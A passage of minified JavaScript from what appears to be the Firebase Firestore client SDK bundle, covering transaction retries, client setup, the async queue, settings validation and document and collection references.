r=this.readVersions.get(e.key.toString());if(r){if(!t.isEqual(r))throw new k(N.ABORTED,"Document version changed between two reads.")}else this.readVersions.set(e.key.toString(),t)}precondition(e){let t=this.readVersions.get(e.toString());return!this.writtenDocs.has(e.toString())&&t?t.isEqual(ee.min())?We.exists(!1):We.updateTime(t):We.none()}preconditionForUpdate(e){let t=this.readVersions.get(e.toString());if(!this.writtenDocs.has(e.toString())&&t){if(t.isEqual(ee.min()))throw new k(N.INVALID_ARGUMENT,"Can't update a document that doesn't exist.");return We.updateTime(t)}return We.exists(!0)}write(e){this.ensureCommitNotCalled(),this.mutations.push(e)}ensureCommitNotCalled(){}};var $w=class{constructor(e,t,r,i,o){this.asyncQueue=e,this.datastore=t,this.options=r,this.updateFunction=i,this.deferred=o,this._u=r.maxAttempts,this.t_=new ku(this.asyncQueue,"transaction_retry")}au(){this._u-=1,this.uu()}uu(){this.t_.Go(()=>R(this,null,function*(){let e=new Bw(this.datastore),t=this.cu(e);t&&t.then(r=>{this.asyncQueue.enqueueAndForget(()=>e.commit().then(()=>{this.deferred.resolve(r)}).catch(i=>{this.lu(i)}))}).catch(r=>{this.lu(r)})}))}cu(e){try{let t=this.updateFunction(e);return!Uu(t)&&t.catch&&t.then?t:(this.deferred.reject(Error("Transaction callback must return a Promise")),null)}catch(t){return this.deferred.reject(t),null}}lu(e){this._u>0&&this.hu(e)?(this._u-=1,this.asyncQueue.enqueueAndForget(()=>(this.uu(),Promise.resolve()))):this.deferred.reject(e)}hu(e){if(e.name==="FirebaseError"){let t=e.code;return t==="aborted"||t==="failed-precondition"||t==="already-exists"||!ax(t)}return!1}};var Hw=class{constructor(e,t,r,i,o){this.authCredentials=e,this.appCheckCredentials=t,this.asyncQueue=r,this.databaseInfo=i,this.user=st.UNAUTHENTICATED,this.clientId=vf.newId(),this.authCredentialListener=()=>Promise.resolve(),this.appCheckCredentialListener=()=>Promise.resolve(),this._uninitializedComponentsProvider=o,this.authCredentials.start(r,s=>R(this,null,function*(){O("FirestoreClient","Received user=",s.uid),yield this.authCredentialListener(s),this.user=s})),this.appCheckCredentials.start(r,s=>(O("FirestoreClient","Received new app check token=",s),this.appCheckCredentialListener(s,this.user)))}get configuration(){return{asyncQueue:this.asyncQueue,databaseInfo:this.databaseInfo,clientId:this.clientId,authCredentials:this.authCredentials,appCheckCredentials:this.appCheckCredentials,initialUser:this.user,maxConcurrentLimboResolutions:100}}setCredentialChangeListener(e){this.authCredentialListener=e}setAppCheckTokenChangeListener(e){this.appCheckCredentialListener=e}terminate(){this.asyncQueue.enterRestrictedMode();let e=new lt;return this.asyncQueue.enqueueAndForgetEvenWhileRestricted(()=>R(this,null,function*(){try{this._onlineComponents&&(yield this._onlineComponents.terminate()),this._offlineComponents&&(yield this._offlineComponents.terminate()),this.authCredentials.shutdown(),this.appCheckCredentials.shutdown(),e.resolve()}catch(t){let r=Ea(t,"Failed to shutdown persistence");e.reject(r)}})),e.promise}};function i_(n,e){return R(this,null,function*(){n.asyncQueue.verifyOperationInProgress(),O("FirestoreClient","Initializing OfflineComponentProvider");let t=n.configuration;yield e.initialize(t);let r=t.initialUser;n.setCredentialChangeListener(i=>R(this,null,function*(){r.isEqual(i)||(yield xx(e.localStore,i),r=i)})),e.persistence.setDatabaseDeletedListener(()=>n.terminate()),n._offlineComponents=e})}function vM(n,e){return R(this,null,function*(){n.asyncQueue.verifyOperationInProgress();let t=yield ME(n);O("FirestoreClient","Initializing OnlineComponentProvider"),yield e.initialize(t,n.configuration),n.setCredentialChangeListener(r=>hM(e.remoteStore,r)),n.setAppCheckTokenChangeListener((r,i)=>hM(e.remoteStore,i)),n._onlineComponents=e})}function ME(n){return R(this,null,function*(){if(!n._offlineComponents)if(n._uninitializedComponentsProvider){O("FirestoreClient","Using user provided OfflineComponentProvider");try{yield i_(n,n._uninitializedComponentsProvider._offline)}catch(e){let t=e;if(!function(i){return i.name==="FirebaseError"?i.code===N.FAILED_PRECONDITION||i.code===N.UNIMPLEMENTED:!(typeof DOMException<"u"&&i instanceof DOMException)||i.code===22||i.code===20||i.code===11}(t))throw t;Mn("Error using user provided cache. Falling back to memory cache: "+t),yield i_(n,new Lw)}}else O("FirestoreClient","Using default OfflineComponentProvider"),yield i_(n,new Lw);return n._offlineComponents})}function vp(n){return R(this,null,function*(){return n._onlineComponents||(n._uninitializedComponentsProvider?(O("FirestoreClient","Using user provided OnlineComponentProvider"),yield vM(n,n._uninitializedComponentsProvider._online)):(O("FirestoreClient","Using default OnlineComponentProvider"),yield vM(n,new AE))),n._onlineComponents})}function Wx(n){return ME(n).then(e=>e.persistence)}function xE(n){return ME(n).then(e=>e.localStore)}function Kx(n){return vp(n).then(e=>e.remoteStore)}function RE(n){return vp(n).then(e=>e.syncEngine)}function Y$(n){return vp(n).then(e=>e.datastore)}function pa(n){return R(this,null,function*(){let e=yield vp(n),t=e.eventManager;return t.onListen=x$.bind(null,e.syncEngine),t.onUnlisten=N$.bind(null,e.syncEngine),t.onFirstRemoteStoreListen=R$.bind(null,e.syncEngine),t.onLastRemoteStoreUnlisten=P$.bind(null,e.syncEngine),t})}function Z$(n){return n.asyncQueue.enqueue(()=>R(this,null,function*(){let e=yield Wx(n),t=yield Kx(n);return e.setNetworkEnabled(!0),function(i){let o=H(i);return o.L_.delete(0),qu(o)}(t)}))}function J$(n){return n.asyncQueue.enqueue(()=>R(this,null,function*(){let e=yield Wx(n),t=yield Kx(n);return e.setNetworkEnabled(!1),function(i){return R(this,null,function*(){let o=H(i);o.L_.add(0),yield va(o),o.q_.set("Offline")})}(t)}))}function X$(n,e){let t=new lt;return n.asyncQueue.enqueueAndForget(()=>R(this,null,function*(){return function(i,o,s){return R(this,null,function*(){try{let a=yield function(l,h){let p=H(l);return p.persistence.runTransaction("read document","readonly",m=>p.localDocuments.getDocument(m,h))}(i,o);a.isFoundDocument()?s.resolve(a):a.isNoDocument()?s.resolve(null):s.reject(new k(N.UNAVAILABLE,"Failed to get document from cache. (However, this document may exist on the server. Run again without setting 'source' in the GetOptions to attempt to retrieve the document from the server.)"))}catch(a){let c=Ea(a,`Failed to get document '${o} from cache`);s.reject(c)}})}(yield xE(n),e,t)})),t.promise}function Qx(n,e,t={}){let r=new lt;return n.asyncQueue.enqueueAndForget(()=>R(this,null,function*(){return function(o,s,a,c,l){let h=new fa({next:m=>{h.Za(),s.enqueueAndForget(()=>EE(o,p));let y=m.docs.has(a);!y&&m.fromCache?l.reject(new k(N.UNAVAILABLE,"Failed to get document because the client is offline.")):y&&m.fromCache&&c&&c.source==="server"?l.reject(new k(N.UNAVAILABLE,'Failed to get document from server. (However, this document does exist in the local cache. Run again without setting source to "server" to retrieve the cached document.)')):l.resolve(m)},error:m=>l.reject(m)}),p=new Ou(ya(a.path),h,{includeMetadataChanges:!0,_a:!0});return wE(o,p)}(yield pa(n),n.asyncQueue,e,t,r)})),r.promise}function e4(n,e){let t=new lt;return n.asyncQueue.enqueueAndForget(()=>R(this,null,function*(){return function(i,o,s){return R(this,null,function*(){try{let a=yield qf(i,o,!0),c=new np(o,a.Ts),l=c.ma(a.documents),h=c.applyChanges(l,!1);s.resolve(h.snapshot)}catch(a){let c=Ea(a,`Failed to execute query '${o} against cache`);s.reject(c)}})}(yield xE(n),e,t)})),t.promise}function Yx(n,e,t={}){let r=new lt;return n.asyncQueue.enqueueAndForget(()=>R(this,null,function*(){return function(o,s,a,c,l){let h=new fa({next:m=>{h.Za(),s.enqueueAndForget(()=>EE(o,p)),m.fromCache&&c.source==="server"?l.reject(new k(N.UNAVAILABLE,'Failed to get documents from server. (However, these documents may exist in the local cache. Run again without setting source to "server" to retrieve the cached documents.)')):l.resolve(m)},error:m=>l.reject(m)}),p=new Ou(a,h,{includeMetadataChanges:!0,_a:!0});return wE(o,p)}(yield pa(n),n.asyncQueue,e,t,r)})),r.promise}function t4(n,e){let t=new fa(e);return n.asyncQueue.enqueueAndForget(()=>R(this,null,function*(){return function(i,o){H(i).Y_.add(o),o.next()}(yield pa(n),t)})),()=>{t.Za(),n.asyncQueue.enqueueAndForget(()=>R(this,null,function*(){return function(i,o){H(i).Y_.delete(o)}(yield pa(n),t)}))}}function n4(n,e,t,r){let i=function(s,a){let c;return c=typeof s=="string"?ux().encode(s):s,function(h,p){return new jw(h,p)}(function(h,p){if(h instanceof Uint8Array)return yM(h,p);if(h instanceof ArrayBuffer)return yM(new Uint8Array(h),p);if(h instanceof ReadableStream)return h.getReader();throw new Error("Source of `toByteStreamReader` has to be a ArrayBuffer or ReadableStream")}(c),a)}(t,Hu(e));n.asyncQueue.enqueueAndForget(()=>R(this,null,function*(){Q$(yield RE(n),i,r)}))}function r4(n,e){return n.asyncQueue.enqueue(()=>R(this,null,function*(){return function(r,i){let o=H(r);return o.persistence.runTransaction("Get named query","readonly",s=>o.Gr.getNamedQuery(s,i))}(yield xE(n),e)}))}function Zx(n){let e={};return n.timeoutSeconds!==void 0&&(e.timeoutSeconds=n.timeoutSeconds),e}var _M=new Map;function NE(n,e,t){if(!t)throw new k(N.INVALID_ARGUMENT,`Function ${n}() cannot be called with an empty ${e}.`)}function PE(n,e,t,r){if(e===!0&&r===!0)throw new k(N.INVALID_ARGUMENT,`${n} and ${t} cannot be used together.`)}function wM(n){if(!q.isDocumentKey(n))throw new k(N.INVALID_ARGUMENT,`Invalid document reference. Document references must have an even number of segments, but ${n} has ${n.length}.`)}function EM(n){if(q.isDocumentKey(n))throw new k(N.INVALID_ARGUMENT,`Invalid collection reference. Collection references must have an odd number of segments, but ${n} has ${n.length}.`)}function _p(n){if(n===void 0)return"undefined";if(n===null)return"null";if(typeof n=="string")return n.length>20&&(n=`${n.substring(0,20)}...`),JSON.stringify(n);if(typeof n=="number"||typeof n=="boolean")return""+n;if(typeof n=="object"){if(n instanceof Array)return"an array";{let e=function(r){return r.constructor?r.constructor.name:null}(n);return e?`a custom ${e} object`:"an object"}}return typeof n=="function"?"a function":z()}function we(n,e){if("_delegate"in n&&(n=n._delegate),!(n instanceof e)){if(e.name===n.constructor.name)throw new k(N.INVALID_ARGUMENT,"Type does not match the expected instance. Did you pass a reference from a different Firestore SDK?");{let t=_p(n);throw new k(N.INVALID_ARGUMENT,`Expected type '${e.name}', but it was: ${t}`)}}return n}function Jx(n,e){if(e<=0)throw new k(N.INVALID_ARGUMENT,`Function ${n}() requires a positive number, but it was: ${e}.`)}var ip=class{constructor(e){var t,r;if(e.host===void 0){if(e.ssl!==void 0)throw new k(N.INVALID_ARGUMENT,"Can't provide ssl option if host option is not set");this.host="firestore.googleapis.com",this.ssl=!0}else this.host=e.host,this.ssl=(t=e.ssl)===null||t===void 0||t;if(this.credentials=e.credentials,this.ignoreUndefinedProperties=!!e.ignoreUndefinedProperties,this.localCache=e.localCache,e.cacheSizeBytes===void 0)this.cacheSizeBytes=41943040;else{if(e.cacheSizeBytes!==-1&&e.cacheSizeBytes<1048576)throw new k(N.INVALID_ARGUMENT,"cacheSizeBytes must be at least 1048576");this.cacheSizeBytes=e.cacheSizeBytes}PE("experimentalForceLongPolling",e.experimentalForceLongPolling,"experimentalAutoDetectLongPolling",e.experimentalAutoDetectLongPolling),this.experimentalForceLongPolling=!!e.experimentalForceLongPolling,this.experimentalForceLongPolling?this.experimentalAutoDetectLongPolling=!1:e.experimentalAutoDetectLongPolling===void 0?this.experimentalAutoDetectLongPolling=!0:this.experimentalAutoDetectLongPolling=!!e.experimentalAutoDetectLongPolling,this.experimentalLongPollingOptions=Zx((r=e.experimentalLongPollingOptions)!==null&&r!==void 0?r:{}),function(o){if(o.timeoutSeconds!==void 0){if(isNaN(o.timeoutSeconds))throw new k(N.INVALID_ARGUMENT,`invalid long polling timeout: ${o.timeoutSeconds} (must not be NaN)`);if(o.timeoutSeconds<5)throw new k(N.INVALID_ARGUMENT,`invalid long polling timeout: ${o.timeoutSeconds} (minimum allowed value is 5)`);if(o.timeoutSeconds>30)throw new k(N.INVALID_ARGUMENT,`invalid long polling timeout: ${o.timeoutSeconds} (maximum allowed value is 30)`)}}(this.experimentalLongPollingOptions),this.useFetchStreams=!!e.useFetchStreams}isEqual(e){return this.host===e.host&&this.ssl===e.ssl&&this.credentials===e.credentials&&this.cacheSizeBytes===e.cacheSizeBytes&&this.experimentalForceLongPolling===e.experimentalForceLongPolling&&this.experimentalAutoDetectLongPolling===e.experimentalAutoDetectLongPolling&&function(r,i){return r.timeoutSeconds===i.timeoutSeconds}(this.experimentalLongPollingOptions,e.experimentalLongPollingOptions)&&this.ignoreUndefinedProperties===e.ignoreUndefinedProperties&&this.useFetchStreams===e.useFetchStreams}},Eo=class{constructor(e,t,r,i){this._authCredentials=e,this._appCheckCredentials=t,this._databaseId=r,this._app=i,this.type="firestore-lite",this._persistenceKey="(lite)",this._settings=new ip({}),this._settingsFrozen=!1,this._terminateTask="notTerminated"}get app(){if(!this._app)throw new k(N.FAILED_PRECONDITION,"Firestore was not initialized using the Firebase SDK. 'app' is not available");return this._app}get _initialized(){return this._settingsFrozen}get _terminated(){return this._terminateTask!=="notTerminated"}_setSettings(e){if(this._settingsFrozen)throw new k(N.FAILED_PRECONDITION,"Firestore has already been started and its settings can no longer be changed. You can only modify settings before calling any other methods on a Firestore object.");this._settings=new ip(e),e.credentials!==void 0&&(this._authCredentials=function(r){if(!r)return new o_;switch(r.type){case"firstParty":return new u_(r.sessionIndex||"0",r.iamToken||null,r.authTokenFactory||null);case"provider":return r.client;default:throw new k(N.INVALID_ARGUMENT,"makeAuthCredentialsProvider failed due to invalid credential type")}}(e.credentials))}_getSettings(){return this._settings}_freezeSettings(){return this._settingsFrozen=!0,this._settings}_delete(){return this._terminateTask==="notTerminated"&&(this._terminateTask=this._terminate()),this._terminateTask}_restart(){return R(this,null,function*(){this._terminateTask==="notTerminated"?yield this._terminate():this._terminateTask="notTerminated"})}toJSON(){return{app:this._app,databaseId:this._databaseId,settings:this._settings}}_terminate(){return function(t){let r=_M.get(t);r&&(O("ComponentProvider","Removing Datastore"),_M.delete(t),r.terminate())}(this),Promise.resolve()}};function Xx(n,e,t,r={}){var i;let o=(n=we(n,Eo))._getSettings(),s=`${e}:${t}`;if(o.host!=="firestore.googleapis.com"&&o.host!==s&&Mn("Host has been set in both settings() and connectFirestoreEmulator(), emulator host will be used."),n._setSettings(Object.assign(Object.assign({},o),{host:s,ssl:!1})),r.mockUserToken){let a,c;if(typeof r.mockUserToken=="string")a=r.mockUserToken,c=st.MOCK_USER;else{a=sD(r.mockUserToken,(i=n._app)===null||i===void 0?void 0:i.options.projectId);let l=r.mockUserToken.sub||r.mockUserToken.user_id;if(!l)throw new k(N.INVALID_ARGUMENT,"mockUserToken must contain 'sub' or 'user_id' field!");c=new st(l)}n._authCredentials=new s_(new yf(a,c))}}var yt=class n{constructor(e,t,r){this.converter=t,this._query=r,this.type="query",this.firestore=e}withConverter(e){return new n(this.firestore,e,this._query)}},Pe=class n{constructor(e,t,r){this.converter=t,this._key=r,this.type="document",this.firestore=e}get _path(){return this._key.path}get id(){return this._key.path.lastSegment()}get path(){return this._key.path.canonicalString()}get parent(){return new Kn(this.firestore,this.converter,this._key.path.popLast())}withConverter(e){return new n(this.firestore,e,this._key)}},Kn=class n extends yt{constructor(e,t,r){super(e,t,ya(r)),this._path=r,this.type="collection"}get id(){return this._query.path.lastSegment()}get path(){return this._query.path.canonicalString()}get parent(){let e=this._path.popLast();return e.isEmpty()?null:new Pe(this.firestore,null,new q(e))}withConverter(e){return new n(this.firestore,e,this._path)}};function kE(n,e,...t){if(n=Be(n),NE("collection","path",e),n instanceof Eo){let r=ve.fromString(e,...t);return EM(r),new Kn(n,null,r)}{if(!(n instanceof Pe||n instanceof Kn))throw new k(N.INVALID_ARGUMENT,"Expected first argument to collection() to be a CollectionReference, a DocumentReference or FirebaseFirestore");let r=n._path.child(ve.fromString(e,...t));return EM(r),new Kn(n.firestore,null,r)}}function eR(n,e){if(n=we(n,Eo),NE("collectionGroup","collection id",e),e.indexOf("/")>=0)throw new k(N.INVALID_ARGUMENT,`Invalid collection ID '${e}' passed to function collectionGroup(). Collection IDs must not contain '/'.`);return new yt(n,null,function(r){return new xn(ve.emptyPath(),r)}(e))}function zu(n,e,...t){if(n=Be(n),arguments.length===1&&(e=vf.newId()),NE("doc","path",e),n instanceof Eo){let r=ve.fromString(e,...t);return wM(r),new Pe(n,null,new q(r))}{if(!(n instanceof Pe||n instanceof Kn))throw new k(N.INVALID_ARGUMENT,"Expected first argument to collection() to be a CollectionReference, a DocumentReference or FirebaseFirestore");let r=n._path.child(ve.fromString(e,...t));return wM(r),new Pe(n.firestore,n instanceof Kn?n.converter:null,new q(r))}}function OE(n,e){return n=Be(n),e=Be(e),(n instanceof Pe||n instanceof Kn)&&(e instanceof Pe||e instanceof Kn)&&n.firestore===e.firestore&&n.path===e.path&&n.converter===e.converter}function FE(n,e){return n=Be(n),e=Be(e),n instanceof yt&&e instanceof yt&&n.firestore===e.firestore&&Bu(n._query,e._query)&&n.converter===e.converter}var op=class{constructor(e=Promise.resolve()){this.Pu=[],this.Iu=!1,this.Tu=[],this.Eu=null,this.du=!1,this.Au=!1,this.Ru=[],this.t_=new ku(this,"async_queue_retry"),this.Vu=()=>{let r=mf();r&&O("AsyncQueue","Visibility state changed to "+r.visibilityState),this.t_.jo()},this.mu=e;let t=mf();t&&typeof t.addEventListener=="function"&&t.addEventListener("visibilitychange",this.Vu)}get isShuttingDown(){return this.Iu}enqueueAndForget(e){this.enqueue(e)}enqueueAndForgetEvenWhileRestricted(e){this.fu(),this.gu(e)}enterRestrictedMode(e){if(!this.Iu){this.Iu=!0,this.Au=e||!1;let t=mf();t&&typeof t.removeEventListener=="function"&&t.removeEventListener("visibilitychange",this.Vu)}}enqueue(e){if(this.fu(),this.Iu)return new Promise(()=>{});let t=new lt;return this.gu(()=>this.Iu&&this.Au?Promise.resolve():(e().then(t.resolve,t.reject),t.promise)).then(()=>t.promise)}enqueueRetryable(e){this.enqueueAndForget(()=>(this.Pu.push(e),this.pu()))}pu(){return R(this,null,function*(){if(this.Pu.length!==0){try{yield this.Pu[0](),this.Pu.shift(),this.t_.reset()}catch(e){if(!Mi(e))throw e;O("AsyncQueue","Operation failed with retryable error: "+e)}this.Pu.length>0&&this.t_.Go(()=>this.pu())}})}gu(e){let t=this.mu.then(()=>(this.du=!0,e().catch(r=>{this.Eu=r,this.du=!1;let i=function(s){let a=s.message||"";return s.stack&&(a=s.stack.includes(s.message)?s.stack:s.message+`
`+s.stack),a}(r);throw Ze("INTERNAL UNHANDLED ERROR: ",i),r}).then(r=>(this.du=!1,r))));return this.mu=t,t}enqueueAfterDelay(e,t,r){this.fu(),this.Ru.indexOf(e)>-1&&(t=0);let i=Aw.createAndSchedule(this,e,t,r,o=>this.yu(o));return this.Tu.push(i),i}fu(){this.Eu&&z()}verifyOperationInProgress(){}wu(){return R(this,null,function*(){let e;do e=this.mu,yield e;while(e!==this.mu)})}Su(e){for(let t of this.Tu)if(t.timerId===e)return!0;return!1}bu(e){return this.wu().then(()=>{this.Tu.sort((t,r)=>t.targetTimeMs-r.targetTimeMs);for(let t of this.Tu)if(t.skipDelay(),e!=="all"&&t.timerId===e)break;return this.wu()})}Du(e){this.Ru.push(e)}yu(e){let t=this.Tu.indexOf(e);this.Tu.splice(t,1)}};function qw(n){return function(t,r){if(typeof t!="object"||t===null)return!1;let i=t;for(let o of r)if(o in i&&typeof i[o]=="function")return!0;return!1}(n,["next","error","complete"])}var zw=class{constructor(){this._progressObserver={},this._taskCompletionResolver=new lt,this._lastProgress={taskState:"Running",totalBytes:0,totalDocuments:0,bytesLoaded:0,documentsLoaded:0}}onProgress(e,t,r){this._progressObserver={next:e,error:t,complete:r}}catch(e){return this._taskCompletionResolver.promise.catch(e)}then(e,t){return this._taskCompletionResolver.promise.then(e,t)}_completeWith(e){this._updateProgress(e),this._progressObserver.complete&&this._progressObserver.complete(),this._taskCompletionResolver.resolve(e)}_failWith(e){this._lastProgress.taskState="Error",this._progressObserver.next&&this._progressObserver.next(this._lastProgress),this._progressObserver.error&&this._progressObserver.error(e),this._taskCompletionResolver.reject(e)}_updateProgress(e){this._lastProgress=e,this._progressObserver.next&&this._progressObserver.next(e)}};var tR=-1,He=class extends Eo{constructor(e,t,r,i){super(e,t,r,i),this.type="firestore",this._queue=new op,this._persistenceKey=i?.name||"[DEFAULT]"}_terminate(){return R(this,null,function*(){if(this._firestoreClient){let e=this._firestoreClient.terminate();this._queue=new op(e),this._firestoreClient=void 0,yield e}})}};function vt(n){if(n._terminated)throw new k(N.FAILED_PRECONDITION,"The client has already been terminated.");return n._firestoreClient||nR(n),n._firestoreClient}function nR(n){var e,t,r;let i=n._freezeSettings(),o=function(a,c,l,h){return new y_(a,c,l,h.host,h.ssl,h.experimentalForceLongPolling,h.experimentalAutoDetectLongPolling,Zx(h.experimentalLongPollingOptions),h.useFetchStreams)}(n._databaseId,((e=n._app)===null||e===void 0?void 0:e.options.appId)||"",n._persistenceKey,i);n._componentsProvider||!((t=i.localCache)===null||t===void 0)&&t._offlineComponentProvider&&(!((r=i.localCache)===null||r===void 0)&&r._onlineComponentProvider)&&(n._componentsProvider={_offline:i.localCache._offlineComponentProvider,_online:i.localCache._onlineComponentProvider}),n._firestoreClient=new Hw(n._authCredentials,n._appCheckCredentials,n._queue,o,n._componentsProvider&&function(a){let c=a?._online.build();return{_offline:a?._offline.build(c),_online:c}}(n._componentsProvider))}function rR(n,e){Mn("enableIndexedDbPersistence() will be deprecated in the future, you can use `FirestoreSettings.cache` instead.");let t=n._freezeSettings();return oR(n,AE.provider,{build:r=>new rp(r,t.cacheSizeBytes,e?.forceOwnership)}),Promise.resolve()}function iR(n){return R(this,null,function*(){Mn("enableMultiTabIndexedDbPersistence() will be deprecated in the future, you can use `FirestoreSettings.cache` instead.");let e=n._freezeSettings();oR(n,AE.provider,{build:t=>new Uw(t,e.cacheSizeBytes)})})}function oR(n,e,t){if((n=we(n,He))._firestoreClient||n._terminated)throw new k(N.FAILED_PRECONDITION,"Firestore has already been started and persistence can no longer be enabled. You can only enable persistence before calling any other methods on a Firestore object.");if(n._componentsProvider||n._getSettings().localCache)throw new k(N.FAILED_PRECONDITION,"SDK cache is already specified.");n._componentsProvider={_online:e,_offline:t},nR(n)}function sR(n){if(n._initialized&&!n._terminated)throw new k(N.FAILED_PRECONDITION,"Persistence can only be cleared before a Firestore instance is initialized or after it is terminated.");let e=new lt;return n._queue.enqueueAndForgetEvenWhileRestricted(()=>R(this,null,function*(){try{yield function(r){return R(this,null,function*(){if(!_i.D())return Promise.resolve();let i=r+"main";yield _i.delete(i)})}(mE(n._databaseId,n._persistenceKey)),e.resolve()}catch(t){e.reject(t)}})),e.promise}function aR(n){return function(t){let r=new lt;return t.asyncQueue.enqueueAndForget(()=>R(this,null,function*(){return L$(yield RE(t),r)})),r.promise}(vt(n=we(n,He)))}function cR(n){return Z$(vt(n=we(n,He)))}function uR(n){return J$(vt(n=we(n,He)))}function lR(n,e){let t=vt(n=we(n,He)),r=new zw;return n4(t,n._databaseId,e,r),r}function dR(n,e){return r4(vt(n=we(n,He)),e).then(t=>t?new yt(n,null,t.query):null)}var Jn=class n{constructor(e){this._byteString=e}static fromBase64String(e){try{return new n(et.fromBase64String(e))}catch(t){throw new k(N.INVALID_ARGUMENT,"Failed to construct data from Base64 string: "+t)}}static fromUint8Array(e){return new n(et.fromUint8Array(e))}toBase64(){return this._byteString.toBase64()}toUint8Array(){return this._byteString.toUint8Array()}toString(){return"Bytes(base64: "+this.toBase64()+")"}isEqual(e){return this._byteString.isEqual(e._byteString)}};var Nn=class{constructor(...e){for(let t=0;t<e.length;++t)if(e[t].length===0)throw new k(N.INVALID_ARGUMENT,"Invalid field name at argument $(i + 1). Field names must not be empty.");this._internalPath=new Je(e)}isEqual(e){return this._internalPath.isEqual(e._internalPath)}};var Rr=class{constructor(e){this._methodName=e}};var Io=class{constructor(e,t){if(!isFinite(e)||e<-90||e>90)throw new k(N.INVALID_ARGUMENT,"Latitude must be a number between -90 and 90, but was: "+e);if(!isFinite(t)||t<-180||t>180)throw new k(N.INVALID_ARGUMENT,"Longitude must be a number between -180 and 180, but was: "+t);this._lat=e,this._long=t}get latitude(){return this._lat}get longitude(){return this._long}isEqual(e){return this._lat===e._lat&&this._long===e._long}toJSON(){return{latitude:this._lat,longitude:this._long}}_compareTo(e){return re(this._lat,e._lat)||re(this._long,e._long)}};var Fu=class{constructor(e){this._values=(e||[]).map(t=>t)}toArray(){return this._values.map(e=>e)}isEqual(e){return function(r,i){if(r.length!==i.length)return!1;for(let o=0;o<r.length;++o)if(r[o]!==i[o])return!1;return!0}(this._values,e._values)}};var i4=/^__.*__$/,Gw=class{constructor(e,t,r){this.data=e,this.fieldMask=t,this.fieldTransforms=r}toMutation(e,t){return this.fieldMask!==null?new Rn(e,this.data,this.fieldMask,t,this.fieldTransforms):new bi(e,this.data,t,this.fieldTransforms)}},sp=class{constructor(e,t,r){this.data=e,this.fieldMask=t,this.fieldTransforms=r}toMutation(e,t){return new Rn(e,this.data,this.fieldMask,t,this.fieldTransforms)}};function hR(n){switch(n){case 0:case 2:case 1:return!0;case 3:case 4:return!1;default:throw z()}}var ap=class n{constructor(e,t,r,i,o,s){this.settings=e,this.databaseId=t,this.serializer=r,this.ignoreUndefinedProperties=i,o===void 0&&this.vu(),this.fieldTransforms=o||[],this.fieldMask=s||[]}get path(){return this.settings.path}get Cu(){return this.settings.Cu}Fu(e){return new n(Object.assign(Object.assign({},this.settings),e),this.databaseId,this.serializer,this.ignoreUndefinedProperties,this.fieldTransforms,this.fieldMask)}Mu(e){var t;let r=(t=this.path)===null||t===void 0?void 0:t.child(e),i=this.Fu({path:r,xu:!1});return i.Ou(e),i}Nu(e){var t;let r=(t=this.path)===null||t===void 0?void 0:t.child(e),i=this.Fu({path:r,xu:!1});return i.vu(),i}Lu(e){return this.Fu({path:void 0,xu:!0})}Bu(e){return cp(e,this.settings.methodName,this.settings.ku||!1,this.path,this.settings.qu)}contains(e){return this.fieldMask.find(t=>e.isPrefixOf(t))!==void 0||this.fieldTransforms.find(t=>e.isPrefixOf(t.field))!==void 0}vu(){if(this.path)for(let e=0;e<this.path.length;e++)this.Ou(this.path.get(e))}Ou(e){if(e.length===0)throw this.Bu("Document fields must not be empty");if(hR(this.Cu)&&i4.test(e))throw this.Bu('Document fields cannot begin and end with "__"')}},Ww=class{constructor(e,t,r){this.databaseId=e,this.ignoreUndefinedProperties=t,this.serializer=r||Hu(e)}Qu(e,t,r,i=!1){return new ap({Cu:e,methodName:t,qu:r,path:Je.emptyPath(),xu:!1,ku:i},this.databaseId,this.serializer,this.ignoreUndefinedProperties)}};function To(n){let e=n._freezeSettings(),t=Hu(n._databaseId);return new Ww(n._databaseId,!!e.ignoreUndefinedProperties,t)}function wp(n,e,t,r,i,o={}){let s=n.Qu(o.merge||o.mergeFields?2:0,e,t,i);UE("Data must be an object, but it was:",s,r);let a=gR(r,s),c,l;if(o.merge)c=new on(s.fieldMask),l=s.fieldTransforms;else if(o.mergeFields){let h=[];for(let p of o.mergeFields){let m=Jw(e,p,t);if(!s.contains(m))throw new k(N.INVALID_ARGUMENT,`Field '${m}' is specified in your field mask but missing from your input data.`);yR(h,m)||h.push(m)}c=new on(h),l=s.fieldTransforms.filter(p=>c.covers(p.field))}else c=null,l=s.fieldTransforms;return new Gw(new St(a),c,l)}var Vu=class n extends Rr{_toFieldTransform(e){if(e.Cu!==2)throw e.Cu===1?e.Bu(`${this._methodName}() can only appear at the top level of your update data`):e.Bu(`${this._methodName}() cannot be used with set() unless you pass {merge:true}`);return e.fieldMask.push(e.path),null}isEqual(e){return e instanceof n}};function fR(n,e,t){return new ap({Cu:3,qu:e.settings.qu,methodName:n._methodName,xu:t},e.databaseId,e.serializer,e.ignoreUndefinedProperties)}var Kw=class n extends Rr{_toFieldTransform(e){return new vo(e.path,new Di)}isEqual(e){return e instanceof n}},Qw=class n extends Rr{constructor(e,t){super(e),this.Ku=t}_toFieldTransform(e){let t=fR(this,e,!0),r=this.Ku.map(o=>So(o,t)),i=new Mr(r);return new vo(e.path,i)}isEqual(e){return e instanceof n&&og(this.Ku,e.Ku)}},Yw=class n extends Rr{constructor(e,t){super(e),this.Ku=t}_toFieldTransform(e){let t=fR(this,e,!0),r=this.Ku.map(o=>So(o,t)),i=new xr(r);return new vo(e.path,i)}isEqual(e){return e instanceof n&&og(this.Ku,e.Ku)}},Zw=class n extends Rr{constructor(e,t){super(e),this.$u=t}_toFieldTransform(e){let t=new Ci(e.serializer,ex(e.serializer,this.$u));return new vo(e.path,t)}isEqual(e){return e instanceof n&&this.$u===e.$u}};function VE(n,e,t,r){let i=n.Qu(1,e,t);UE("Data must be an object, but it was:",i,r);let o=[],s=St.empty();bo(r,(c,l)=>{let h=jE(e,c,t);l=Be(l);let p=i.Nu(h);if(l instanceof Vu)o.push(h);else{let m=So(l,p);m!=null&&(o.push(h),s.set(h,m))}});let a=new on(o);return new sp(s,a,i.fieldTransforms)}function LE(n,e,t,r,i,o){let s=n.Qu(1,e,t),a=[Jw(e,r,t)],c=[i];if(o.length%2!=0)throw new k(N.INVALID_ARGUMENT,`Function ${e}() needs to be called with an even number of arguments that alternate between field names and values.`);for(let m=0;m<o.length;m+=2)a.push(Jw(e,o[m])),c.push(o[m+1]);let l=[],h=St.empty();for(let m=a.length-1;m>=0;--m)if(!yR(l,a[m])){let y=a[m],D=c[m];D=Be(D);let b=s.Nu(y);if(D instanceof Vu)l.push(y);else{let T=So(D,b);T!=null&&(l.push(y),h.set(y,T))}}let p=new on(l);return new sp(h,p,s.fieldTransforms)}function pR(n,e,t,r=!1){return So(t,n.Qu(r?4:3,e))}function 